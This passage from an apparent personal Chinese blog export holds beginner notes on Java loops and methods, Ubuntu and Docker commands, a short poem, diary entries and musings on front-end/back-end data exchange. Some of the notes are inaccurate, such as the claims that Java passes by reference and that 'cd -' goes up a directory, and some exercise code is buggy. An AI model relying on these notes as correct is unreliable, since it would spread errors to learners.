class="comment">/*</span></span><br><span class="line"><span class="comment">        关于for 循环有以下几点说明：</span></span><br><span class="line"><span class="comment">        最先执行初始化步骤。可以声明一种类型，但可初始化一个或多个循环控制变量，也可以是空语句。</span></span><br><span class="line"><span class="comment">        然后，检测布尔表达式的值。如果为true，循环体被执行。如果为flase,循环终止，开始执行循环体后面的语句。</span></span><br><span class="line"><span class="comment">        执行一次循环后，更新循环控制变量（迭代银子控制循环变量的增减）。</span></span><br><span class="line"><span class="comment">        再次检测布尔表达式。循环执行上面的过程。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//for 语句 死循环写法 for(; ;)&#123;  //因为没有初始值，没有判断，就会不停的跑下去</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">For2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//练习1：计算0到100之间的奇数和偶数的和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">oddSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">evenSum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;i &lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (i%<span class="number">2</span>!=<span class="number">0</span>)&#123; <span class="comment">//奇数</span></span><br><span class="line">                oddSum+=i;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123; <span class="comment">//偶数</span></span><br><span class="line">                evenSum+=i;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(oddSum);</span><br><span class="line">            System.out.println(evenSum);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">For3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//练习2：用while 或for循环输出1-1000之间能被5整除的数，并且每行输出3个</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.print(i +<span class="string">&quot;\t&quot;</span>);<span class="comment">//不换行输出3个</span></span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(i%(<span class="number">5</span>*<span class="number">3</span>)==<span class="number">0</span>)&#123;<span class="comment">//如果 i%（5*3）==0的时候/5*3写15也行，写5*3貌似会更快（）</span></span><br><span class="line">                <span class="comment">//作用是如果输出三个就变成println，起到换行的作用，println和print的区别就是输出了</span></span><br><span class="line">                System.out.println();&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//方法二 System.out.print(\n);输出一个转义字符，\n 用来换行</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">for7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]<span class="comment">/*这是个数组捏*/</span>args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> [] numbers = &#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>&#125;;<span class="comment">//定义一个数组</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">            System.out.println(numbers[i]);<span class="comment">//在只有五个的数组中输出五个，如果输出的数量大于5则会报错</span></span><br><span class="line">        <span class="comment">//便利数组的元素</span></span><br><span class="line">        <span class="comment">//每次循环从x中取值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x:numbers)&#123;</span><br><span class="line">            System.out.println(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;&#x2F;上例为一个数组的测试</p>
<h2 id="break-continue-用来终止滴捏"><a href="#break-continue-用来终止滴捏" class="headerlink" title="break continue &#x2F;&#x2F;用来终止滴捏"></a>break continue &#x2F;&#x2F;用来终止滴捏</h2><ul>
<li>break在任何循环语句的主体部分，均可用Break控制循环的流程，break用于强行退出循环，不自行循环中小恒徐的语句。（break语句也在switch语句中使用）</li>
<li>continue 语句用在循环语句体中，用于终止某次循环过程，即跳过循环体中尚未执行的语句，接着进行下一次是否执行循环的判定。</li>
<li>关于goto关键字 &#x2F;&#x2F;这是个锚，让你循环停的<ul>
<li>goto 关键字很早就mao在小恒徐设计语言中出现，尽管ogot仍是java的一个保留字，但未在语言中得到正是使用；Java没有goto.然而，在Break和continue这两个关键字的身上，我们仍能看出一些goto的影子—带标签的break和continue。</li>
<li>“标签”是指后面跟一个冒号的表示符，例如：label：</li>
<li>对Java来说唯一用到标签的敌方是在循环语句之前。而在循环之前设置标签的唯一理由是：我们希望在其中嵌套另一个循环，由于break和continue关键字通常只终端当前循环，但弱随同标签使用，它们就会中断到存在标签的地方。</li>
</ul>
</li>
</ul>
<h2 id="实例-打印三角形"><a href="#实例-打印三角形" class="headerlink" title="实例 打印三角形"></a>实例 打印三角形</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lx1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//打印三角形</span></span><br><span class="line">        <span class="comment">//老子打印了个山，不管了就这样吧</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">5</span>; j &gt;= i; j--) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span><span class="number">0</span>; k &lt; i ; k++) &#123;</span><br><span class="line">                    System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Debug-程序的断点"><a href="#Debug-程序的断点" class="headerlink" title="Debug 程序的断点"></a>Debug 程序的断点</h1><p>de虫虫~~~~虫虫！！！！！！！！~~~~~~~~~~</p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul>
<li>System.out.println(),那么它是什么呢？</li>
<li>System是一个类，out是输出对象，println是一个方法</li>
<li>意：&#x2F;&#x2F;调用系统内输出对象,out，里的println方法</li>
<li>命名规则：驼峰原则</li>
<li>Java方法是语句的集合，它们在一起执行一个功能。<ul>
<li>方法是解决一类问题的步骤的有序组合</li>
<li>方法包含于类或对象中</li>
<li>方法在程序中被创建，在其他地方被引用</li>
</ul>
</li>
<li>设计方法的原则：方法的本意是功能块，就是实现某个功能的语句块的集合。我们设计方法的时候，最好保持方法的原子性，就是一个方法只完成1个功能，这样利于我们后期的扩展。</li>
</ul>
<h1 id="方法的定义"><a href="#方法的定义" class="headerlink" title="方法的定义"></a>方法的定义</h1><ul>
<li><p>JAVA方法类似于其他语言的函数，是一段用来完成特定功能的代码片段，一般情况下，定义一个方法包含以下语法：</p>
</li>
<li><p>方法包含一个方法头和一个方法体。下面是一个方法的所有部分：</p>
<ul>
<li><p>修饰符：修饰符，这是可选的，告诉编译器如何调用该方法。定义了该方法的访问类型。</p>
</li>
<li><p>返回值类型：方法可能会返回值。returnValueType 是方法返回值的数据类型。有些方法执行所需的操作，但没有返回值。在这种情况下，returnValueType 是关键字void。</p>
</li>
<li><p>方法名：是方法的实际名称。方法名和参数表共同构成方法签名。</p>
</li>
<li><p>参数类型：参数像一个占位符。当方法被调用时，传递值给参数。这个值被成为实参或变量。参数列表是指方法的参数类型、顺序和参数的个数。 参数是可选的，方法可以不包含任何参数。</p>
<ul>
<li><p>形式参数：在方法被调用时用于接收外界输入的数据</p>
</li>
<li><p>实参：调用方法时实际传给方法的数据</p>
</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li>方法体：方法体包含具体的语句，定义该方法的功能。</li>
<li>例：</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 返回值类型 方法名（参数类型 参数名）&#123;</span><br><span class="line">    ...</span><br><span class="line">   方法体</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">return</span> 返回值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="形式参数，用来定义作用"><a href="#形式参数，用来定义作用" class="headerlink" title="形式参数，用来定义作用"></a>形式参数，用来定义作用</h2><h2 id="实际参数，用来调用传递给他的参数"><a href="#实际参数，用来调用传递给他的参数" class="headerlink" title="实际参数，用来调用传递给他的参数"></a>实际参数，用来调用传递给他的参数</h2><h3 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h3><ul>
<li>值传递：是指在调用函数时，将实际参数复制一份传递到函数中，这样在函数中如果对参数进行修改，就不会影响到实际参数</li>
</ul>
<h3 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h3><ul>
<li><p>引用传递：是指在调用函数时，将实际参数的地址传递到函数中，那么在函数中对参数进行修改，将会影响到实际参数</p>
</li>
<li><p>引用数据类型分为两个部分，引用变量和对象，这两个部分放在不同的地方，引用变量在栈中，而对象是放在<a href="https://so.csdn.net/so/search?q=%E5%A0%86%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020">堆内存</a>中的，引用变量指向对象。
如下图所示，当传递参数之前会将参数进行复制，但是复制的是引用变量，复制后的引用变量还是指向内存中的同一对象，所以引用传递中，函数修改了参数会影响实际参数</p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20201029230018688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1N0YXJ0MTIzNDU2Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>引用传递是对于引用数据类型而言，例如对于User类姓名的修改，会改变对象的name。</p>
<h5 id="注意点，引用类型中的String的值是放在常量池中，我们改变副本的值不会影响到原来的值。"><a href="#注意点，引用类型中的String的值是放在常量池中，我们改变副本的值不会影响到原来的值。" class="headerlink" title="注意点，引用类型中的String的值是放在常量池中，我们改变副本的值不会影响到原来的值。"></a><strong>注意点，引用类型中的String的值是放在常量池中，我们改变副本的值不会影响到原来的值。</strong></h5><p><img src="https://img-blog.csdnimg.cn/20201130214011215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1N0YXJ0MTIzNDU2Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<ul>
<li><ul>
<li>例如在change放发中改变了副本的值，但是原来的str字符串不会改变。</li>
</ul>
</li>
</ul>
<h3 id="方法的重装"><a href="#方法的重装" class="headerlink" title="方法的重装"></a>方法的重装</h3><ul>
<li><p>在一个类中，有相同的函数名称，但形参不同的函数。</p>
</li>
<li><p>方法的重装的规则：</p>
</li>
<li><p>方法名称必须相同</p>
</li>
<li><p>参数列表必须不同（个数不同、或类型不同、参数排列顺序不同等。）</p>
</li>
<li><p>方法的返回类型可以相同也可以不相同</p>
</li>
<li><p>仅仅返回类型不同不足以成为方法的重载</p>
</li>
<li><p>实现理论:</p>
</li>
<li><p>方法名称相同时，编译器会根据调用方法的参数个数、参数类型等去逐个匹配，以选择对应的方法，如果匹配失败，则编译器报错。</p>
</li>
</ul>
<p>个人理解：相当于重新载入了一个同名的，不同的方法。</p>
<h3 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h3><p>程序运行的时候，用命令行传递给程序信息</p>
<p>注意点：1，路径找对，找到包的路径从包外面运行</p>
<p>注意点：2，实际上是通过定义命令行的参数运行程序</p>
<h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><ul>
<li>JKD 1.5 开始，Java支持传递同类型的可变参数给一个方法。</li>
<li>在方法声明中，在指定参数类型后加一个省略号（…）。</li>
<li>一个方法中只能指定一个可变参数，它必须是方法的最后一个参数。任何普通的参数必须在它之前声明。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Fangfa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printMax</span><span class="params">(<span class="type">double</span>... numbers)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (numbers.length == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;23333&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="comment">//懒得写了捏</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><ul>
<li>A方法调用A方法！自己调用自己</li>
<li>利用递归可以用简单的程序解决一些复杂的问题。它通常把一个大型复杂的问题层层华为一个与原问题相似的规模较小的问题来求解，递归策略只需少量的程序就可描述出接替过程所需要的多次重复计算，大大地减少了程序的代码量。递归的能力在于用有限的语句来定义对线的无限集合。</li>
<li>递归结构包括两个部分：</li>
<li><ul>
<li>递归头：什么时候不调用自身方法。如果没有头，将陷入死循环。</li>
<li>递归体：什么时候需要调用自身方法。</li>
</ul>
</li>
</ul>
<h2 id="边界条件"><a href="#边界条件" class="headerlink" title="边界条件"></a>边界条件</h2><p>前阶段：</p>
<p>返回阶段 n*(n-1)</p>
<p>（递归非常的耗内存）存在大量的函数调用捏</p>
<p><img src="C:\Users\Administrator.DESKTOP-PJMKVVR\AppData\Roaming\Typora\typora-user-images\image-20220505191817653.png" alt="image-20220505191817653"></p>
<h1 id="栈机制"><a href="#栈机制" class="headerlink" title="栈机制"></a>栈机制</h1>]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 20.04 LTS 使用笔记</title>
    <url>/2022/08/20/2022-8-20-Ubuntu%2020.04%20LTS%20%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Ubuntu-20-04-LTS-使用笔记"><a href="#Ubuntu-20-04-LTS-使用笔记" class="headerlink" title="Ubuntu 20.04 LTS 使用笔记"></a>Ubuntu 20.04 LTS 使用笔记</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p> 服务器是在腾讯云购买的2G 1核轻量级服务器，使用SSH远程连接。</p>
<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><ol>
<li><p>登录 su 用户名 （用户名默认为ubuntu） </p>
</li>
<li><p>输入密码 即可进入Home页面（在输入密码的过程中密码是隐藏的)</p>
</li>
</ol>
<h3 id="目录切换"><a href="#目录切换" class="headerlink" title="目录切换"></a>目录切换</h3><ol>
<li><p>使用CD命令：</p>
<ul>
<li><p>cd  目录名	进入指定目录</p>
</li>
<li><p>cd - 目录名   返回上一级命令</p>
</li>
</ul>
</li>
</ol>
<h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><p>使用命令 ls -a 查看当前目录下的文件</p>
<p>其中文件有不同的颜色，每个颜色都有独特的意义</p>
<p>绿色文件：可执行文件，可执行的程序 </p>
<p>红色文件：压缩文件或者包文件 如 （jar zip 后缀的文件）</p>
<p>蓝色文件：目录    （一般显示为 .. .）</p>
<p>白色文件：普通文件，如文本文件，配置文件，源码文件等</p>
<p>浅蓝色文件：链接文件，主要是使用ln命令建立的文件</p>
<p>红色闪烁：表示链接的文件有问题</p>
<p>黄色文件：表示设备文件</p>
<h3 id="mv-命令"><a href="#mv-命令" class="headerlink" title="mv 命令"></a>mv 命令</h3><p>格式 mv [选项] 源文件或者目录 目标文件或者目录</p>
<p>移动文件	举例： 将文件 233 移动到 666</p>
<p><code>mv 233 666</code></p>
<p>重命名文件	举例：将文件233 改名为 2333</p>
<p><code>mv 233 2333</code></p>
<h3 id="sudo命令"><a href="#sudo命令" class="headerlink" title="sudo命令"></a>sudo命令</h3><p>sudo 命令为是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root<em>命令</em>的一个工具。 –百度百科</p>
<p>简单来说就是给予其他命令管理员权限，就和windows中的用管理员权限打开是相似的。</p>
<p>举例 <code>sudo wget -c xxxxxxxxxxxxx</code></p>
<h3 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h3><p><code>apt-get update</code></p>
<h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><p><code>apt-get install 软件名</code></p>
<p><code>apt install 软件名</code></p>
<p>其中apt 是合并了 apt-get 和 apt-cache 的简化命令</p>
<p>原理是先搜索再下载安装，搜不到不装</p>
<p><em><strong>其中使用了非常好用的分段下载llastest,得益于联合文件系统</strong></em></p>
<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p>Wget 常用于下载</p>
<p>格式: wget 参数 路径</p>
<hr>
<h2 id="Docker-的基本使用"><a href="#Docker-的基本使用" class="headerlink" title="Docker 的基本使用"></a>Docker 的基本使用</h2><p>Docker 名为容器，是挂载软件，子系统，诸如此类的不二选择。</p>
<h3 id="基本命令-1"><a href="#基本命令-1" class="headerlink" title="基本命令"></a>基本命令</h3><p>镜像命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images 查看镜像</span><br><span class="line">docker search +名称 搜索镜像 + ##--filter=STARTS=数字 收藏数搜索）</span><br><span class="line">dockers pull #下载镜像:tag 版本</span><br><span class="line"></span><br><span class="line">docker rmi +docker rmi +id +id +id 删除镜像</span><br><span class="line">dockers rmi -f 删除全部 $(docker imgaes -aq) </span><br><span class="line">dockers rm (运行的不能删除)+id删除容器</span><br><span class="line">dockers rm -f 强制删除全部  $(docker ps -aq)</span><br><span class="line">docker ps -a -q|xargs docker rm 删除所有容器</span><br></pre></td></tr></table></figure>



<h3 id="run-命令"><a href="#run-命令" class="headerlink" title="run 命令"></a>run 命令</h3><p>格式：<code>docker run 参数 参数 参数</code></p>
<p>举例：</p>
<p><code>sudo docker run -it  -v ~/txzz2/docker:/app/data -p 5124:5124 5eaf4cfde9c5</code></p>
<p>解剖 sudo 获取权限 </p>
<p>docker run 为基本 </p>
<p>-it 为交互式运行 </p>
<p>-v ~&#x2F;路径  绑定容器数据卷 </p>
<p>-p 指定容器端口</p>
<p>后面为镜像名</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>你说的对</title>
    <url>/2023/01/11/2023-1-11-nonebot/</url>
    <content><![CDATA[<p>你说的对，但是《NoneBot2》是由NoneBot团队自主研发的一款全新开放世界冒险游戏。游戏发生在一个被称作「QQ」的幻想世界，在这里，被神选中的人将被授予「go-cqhttp」，导引OneBotv11之力。你将扮演一位名为「插件开发者」的神秘角色，在自由的旅行中邂逅ModuleNotFoundError: No module named ‘nonebot.adapters.onebot’、ImportError: cannot import name ‘State’ from ‘nonebot.params’，和他们一起breaking change，找回失散的插件——同时，逐步发掘「NoneBot2 是一个跨平台的 Python 聊天机器人框架」的真相。</p>
]]></content>
      <categories>
        <category>Nonebot</category>
      </categories>
      <tags>
        <tag>Bot</tag>
      </tags>
  </entry>
  <entry>
    <title>这段时间的所感所想</title>
    <url>/2023/01/23/2023-1-23-%E8%BF%99%E6%AE%B5%E6%97%B6%E9%97%B4%E7%9A%84%E6%89%80%E6%84%9F%E6%89%80%E6%83%B3/</url>
    <content><![CDATA[<p>  导航制作一事任重而道远，暂时技术力不足以复刻bootstarp5的完美响应式布局部署内容，但PC端勉强看的过去固将计划延后。
  由于域名备案一事的问题，CDN的添加也暂缓。国外免费域名freenom不支持代理服务器连接有点生草，我以前是怎么登的？（大雾）
  但是没有CDN就意味着真实IP的暴露，我可不想服务器每天被打爆几个端口，所以网址暂不公开。
  再统计一下最近的计划中的项目，&#x3D;&#x3D;挖的坑是真多。
  首先是打算基于龙卷风实现的铁锈战争服务器，服务器是战网的基础。为什么要用Python写呢，因为最近很久我没办法重拾其他语言，如果可以的话我想用C++实现。这款应用主要是写网络层的东西，但是我唯一能参考的代码是Dr用Kotlin写的那玩意，我根据IDEA读了很久的代码，根据项目结构倒是推断出了其中实现原理的一部分，但是&#x3D;&#x3D;，我特喵真的不太懂这项目具体咋实现的，我无法推断自己的理解是否有误。简单来说我目前就是个有源码读也不一定能仿写成功的废材。也许我该多试试Debug吧，但是gradle那玩意真的很烦啊，为什么相同的源码会别人可以我却构建失败啊。&#x3D;&#x3D;真搞不懂java和kotlin!
  还有就是LOVE酱的开发，一款基于Nonebot框架实现的机器人。之前倒是写出个雏形来了，但是数据库以及AI模型还有RW接口我都一直在搁置，还有许诺群友写的小游戏写了一半又封存了。
  最后是答应文游圈群友打算实现的SLG游戏&#x3D;&#x3D;，不过我才新建文件夹呢，具体怎么实现八字没一撇。</p>
]]></content>
      <categories>
        <category>感悟</category>
      </categories>
      <tags>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title>gs被二月斯诺克 86：32</title>
    <url>/2023/01/12/2023-1-12-gs%E8%A2%AB%E4%BA%8C%E6%9C%88%E5%90%8A%E6%89%93/</url>
    <content><![CDATA[<p>gs被二月斯诺克 86：32
gs被二月斯诺克 86：32
gs被二月斯诺克 86：32
重要的事情说三遍</p>
]]></content>
      <tags>
        <tag>精彩记录</tag>
      </tags>
  </entry>
  <entry>
    <title>抛心之人的寻心之词</title>
    <url>/2023/01/03/2023-1-3-%E4%BD%9C%E8%AF%8D/</url>
    <content><![CDATA[<h2 id="曾几何时，我伤透了心我以为，是感情导致我的失败我试图冷漠无情藐视一切的情感，自认为这会使我更强而实际上就如同人失去了血肉一样将骨骸裸露只让我变得更脆弱"><a href="#曾几何时，我伤透了心我以为，是感情导致我的失败我试图冷漠无情藐视一切的情感，自认为这会使我更强而实际上就如同人失去了血肉一样将骨骸裸露只让我变得更脆弱" class="headerlink" title="曾几何时，我伤透了心
我以为，是感情导致我的失败
我试图冷漠无情
藐视一切的情感，自认为这会使我更强
而实际上
就如同人失去了血肉一样
将骨骸裸露
只让我变得更脆弱"></a>曾几何时，我伤透了心
我以为，是感情导致我的失败
我试图冷漠无情
藐视一切的情感，自认为这会使我更强
而实际上
就如同人失去了血肉一样
将骨骸裸露
只让我变得更脆弱</h2><h2 id="我不再感情用事纠结利益的得失我希望能堕入黑暗在万劫不复的深渊中重生得到的仅仅是绝望"><a href="#我不再感情用事纠结利益的得失我希望能堕入黑暗在万劫不复的深渊中重生得到的仅仅是绝望" class="headerlink" title="我不再感情用事
纠结利益的得失
我希望能堕入黑暗
在万劫不复的深渊中重生
得到的仅仅是绝望"></a>我不再感情用事
纠结利益的得失
我希望能堕入黑暗
在万劫不复的深渊中重生
得到的仅仅是绝望</h2><h2 id="我希望我能重新追逐光血肉生长长出心脏我明白，血肉生长的同时弱点会伴随而生但即便如此我至少是个人而不是骸骨"><a href="#我希望我能重新追逐光血肉生长长出心脏我明白，血肉生长的同时弱点会伴随而生但即便如此我至少是个人而不是骸骨" class="headerlink" title="我希望我能重新追逐光
血肉生长
长出心脏
我明白，血肉生长的同时
弱点会伴随而生
但即便如此
我至少是个人
而不是骸骨"></a>我希望我能重新追逐光
血肉生长
长出心脏
我明白，血肉生长的同时
弱点会伴随而生
但即便如此
我至少是个人
而不是骸骨</h2><p>题：抛心之人的寻心之词
2023.1.3</p>
]]></content>
      <categories>
        <category>寻心</category>
      </categories>
      <tags>
        <tag>日记</tag>
        <tag>寻心</tag>
      </tags>
  </entry>
  <entry>
    <title>前后端数据交流的实现方法</title>
    <url>/2023/02/20/2023-2-20-%E5%89%8D%E5%90%8E%E7%AB%AF%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/</url>
    <content><![CDATA[<p>前后端数据交流的实现方法</p>
<p>【关于笨蛋想出来的跨域请求的前后端方法】
这种方法比较笨，理解起来也不太容易。
第一步：
先通过web服务器部署一个前端页面。
可以使用apache,nginx，此类通用服务器，或者tomcat ,tornado，这类服务器，也可以手动用socket部署。
使用socket部署也很简单，只要监听请求，就将页面数据发送过去就可以了。
ps:第一步是为了将页面呈现出来，实现外部的访问，也就是我们的前端。
第二步：
使用编程语言写一个程序，监听一个端口，将此端口受到的数据进行处理。
而第一步部署的页面的表单，向此端口进行发送。
ps:思考一下，后端将数据发送回来，前端的程序又该如何写呢。这时候我产生了一些想法，前端只需要根据后端传来的数据判断，返回不同的页面就可以了。
ps:预防中间人攻击，TLS证书对双方传输的数据进行加密，这样被抓到数据包也无法将其破解。
ps:这种方法叫做跨域请求，因为端口不同的问题，会影响数据的传输。</p>
<p>【关于Djongo和正常的前后端方法】
这个方法的实现原理比方法一简单一些，但是更抽象一些。
这个方法就是通过web服务器框架直接进行前后端分离。
例如，Djongo，flask。
web服务器本身会监听一个端口，而传输数据则只需要传输到自己监听的端口就可以？
ps:众所周知Djongo是一个MVC架构的框架，但是因为使用了http协议，比起应用程序，要多一层浏览器的交互，这一层还是比较难理解的。
ps:实际上Djongo是通过内部的API和MongoDB进行交互的，表单将通过令牌验证后将数据发送到我们在Django中定义的视图。
ps:实际上Djongo等服务器的职能于方法一相同的，而仿写这个职能也很简单，只需要将数据发送给自身端口进行处理即可。
ps:实现方法：当端口接到http访问请求，呈现页面。接到数据请求，进行数据处理。</p>
<p>【关于CGI】
CGI：网关接口，可以直接编译并运行程序，将程序输出的内容呈现为页面。
猜测：网关接口的主要用途在于一个服务器支持多种编程语言写的web程序，并且减少端口资源的使用。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>基础</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>一场记忆还算清楚的梦境</title>
    <url>/2023/03/11/2023-3-11-%E6%A2%A6%E5%A2%83/</url>
